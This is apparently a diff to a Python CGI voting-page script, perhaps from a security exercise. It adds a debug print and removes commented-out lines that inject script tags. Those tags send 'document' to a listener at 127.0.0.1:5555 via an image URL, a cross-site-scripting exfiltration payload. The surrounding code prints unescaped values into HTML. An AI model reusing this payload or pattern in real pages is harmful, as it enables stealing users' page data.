@@ -28,12 +28,12 @@ try:
         [PATH_TO_MACHINE, "get-elections"]).decode('utf-8')
     elections = json.loads(json_elections)
     if len(form) != 0:
+        print("Vote:", len(form))
         ids = form.getvalue('election').split('_')
         unique_office_id = str(elections[ids[0]]['offices'][int(ids[1])]['id'])
         unqiue_candidate_id = str(elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['id'])
         subprocess.check_output(
             [PATH_TO_MACHINE, 'vote', form.getvalue('voterId'), form.getvalue('passwd'), str(convert_date_to_id(ids[0])), unique_office_id, unqiue_candidate_id])
-	#add password
         print('<b>Sucessfully cast ballot.</b>')
         print('<ul>')
         print('<li id="result">Election Date: {}</li>'.format(ids[0]))
@@ -42,10 +42,7 @@ try:
         print('<li id="date">Candidate: {}</li>'.format(
             elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['name']))
         print('</ul>')
-        #
-        # print('<script>document.write("<img src=http://127.0.0.1:5555?c="+ escape("Something Malicious Occur") + " >");</script>')
-        # print('<script>document.write("<img src=http://127.0.0.1:5555?c="+ escape(document) + " >");</script>')
-        #
+
     else:
         print('<form method="post">')
         print('<label for="voterId">Voter ID</label><br>')
